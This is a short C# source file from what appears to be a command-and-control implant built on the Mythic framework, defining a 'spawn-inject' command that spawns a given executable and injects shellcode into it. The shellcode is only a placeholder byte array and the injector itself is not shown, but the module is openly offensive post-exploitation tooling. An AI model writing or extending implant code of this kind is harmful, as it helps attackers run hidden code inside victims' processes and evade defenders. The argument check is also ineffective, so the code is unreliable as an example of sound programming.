using Internal;

using Models.Tasks;

using Extend;

namespace Tasks.Commands
{
    public class SpawnInject : CerberusCommand
    {
        public override string Name => "spawn-inject";

        public override string Execute(MythicTask task)
        {
            var Arguments = task.parameters.Split(' ');
            var FileBytes = new byte[10];

            if (Arguments is null || Arguments.Length == 0)
                return "No path specified. Please specify the path to the executable you want to spawn-inject into";

            var path = Arguments[0];

            var injector = new SpawnInjector();
            var success = injector.Inject(FileBytes, 0, path);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}
